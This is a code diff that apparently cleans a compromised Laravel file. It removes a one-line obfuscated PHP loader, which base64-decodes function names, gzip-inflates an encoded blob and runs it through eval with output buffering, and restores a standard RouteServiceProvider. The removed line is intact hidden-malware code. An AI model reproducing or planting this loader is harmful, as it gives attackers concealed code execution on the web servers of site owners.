@@ -1,1 +1,52 @@
-<?php $_='c2f8a1f9';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNqlVVFzokgQfr9f4cNWmdTeA2DMhkrlIYNhBIyeKAPMS0pmElAZYM8o4q+/HtCIu8m+nFWtI8x0f/311z2dTvP59nL+PHR1jevqzetr9/5b86D4d5m9v3Xv/+q09j90uoGq7yKfZOH04aHbOb8++XuAZZcJovDA3loGSrkwN47hvgXqXTEp5aHOpdOXTqc+FC02r7c3L/yV5Rxw/AZxMM3HhugnEP3AsLmiM4TYEDFvaO+4SNc0sA+TUnEG00JlmhfP/P2G+2oRCVOhZD8I/XEOv7MwcNM5Tt8XgQvvOGvW0x9fnMNRj2wpNpWFr28Dc6xCzB3L3Iu4gQlr8OtppIJnK0pQFfVoQTGpLGweLHOcsowWoUamTOjawndTttqMjYwcIA87wns18tOtxBY8JQqXeQmy55ArH3yxr4XFFeYqlD7Vi/y+jvHFWchVoXM4EytOqO0T1nuOPaGrHJM55Am4x+k5byumQaJQv79mFfrsPcQGX8vH2DIed84yP61jZ4m8BfZiJnk1kBJVSJH/LZGAurylNWz4tDDdsSXqAy7JY8nwHjhsajECjNIX2E/QRtys85jgpAA80qCeZG1hu289QS7C1KhfxmFAIBbZcpyuQqkB7Sbm+C4G0a4XgZ2GvWnMA1mv5zj0qSLzjLCeLfybbStOO5dHEHllDccKE+mWlmdco9N6iNRQAPYKrSKtf+AGsuaKaloDJbYrPY80NbUPDe/N2bufTis/68lNqfQ9O3LxwY+6A41tIEfQa63nw8hAJeQFuKEBMS2ioStzgT1ECaubM+4L/6iigasyAVwIvaCPf8xBcL+/Av520RItI01XHGN99It+nDmS5gLX6WE078u8xcLnEIP80oMsd+bt3Gtb87qOynfW6O/gYKpGYlzX3jLiwhp+aOtsxz6crIp36LF1hEkvhJo6Bu9R38qc6UWMlinfaU+efcxDYR4o0SWHOZyr6p4InndcI8tRhnJmsOITvLU1veLdTjLg06fFqxFnYYAKu1r/jrWx93+ECnPC3dCAg0a93NbMcjFjxSWPZwMuM8kJM5JlCDoNeijhOM7tXpM7q/SE4fWW4aSEuMWkbONEeo29qZVez9TP+3NwrpcH/ZGkoDmI40EvHGcL9AcVOmjRzUGXCcyTDfR/0ujif+kMOHehD0HzxoXW/qyhU21/0YUn57i3L2D2yV6+nQg5U051KWOakS3EqueAY9opC0jKYAbYw4/151qD93xIKsD1vID7gg/yWwbzfg4zVtbBGYTlmevG3mbrj/54A7zSWnds6xqtf6+O/67rW7n17Pr+tLN+eNWV392/P7ZfXrBHP1ft+/T6+v4/efWb9Q=='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Providers;
+
+use Illuminate\Cache\RateLimiting\Limit;
+use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\RateLimiter;
+use Illuminate\Support\Facades\Route;
+
+class RouteServiceProvider extends ServiceProvider
+{
+    /**
+     * The path to the "home" route for your application.
+     *
+     * This is used by Laravel authentication to redirect users after login.
+     *
+     * @var string
+     */
+    public const HOME = '/home';
+
+    /**
+     * Define your route model bindings, pattern filters, etc.
+     *
+     * @return void
+     */
+    public function boot()
+    {
+        $this->configureRateLimiting();
+
+        $this->routes(function () {
+            Route::middleware('web')
+                ->group(base_path('routes/web.php'));
+
+            Route::prefix('api')
+                ->middleware('api')
+                ->group(base_path('routes/api.php'));
+        });
+    }
+
+    /**
+     * Configure the rate limiters for the application.
+     *
+     * @return void
+     */
+    protected function configureRateLimiting()
+    {
+        RateLimiter::for('api', function (Request $request) {
+            return Limit::perMinute(60);
+        });
+    }
+}
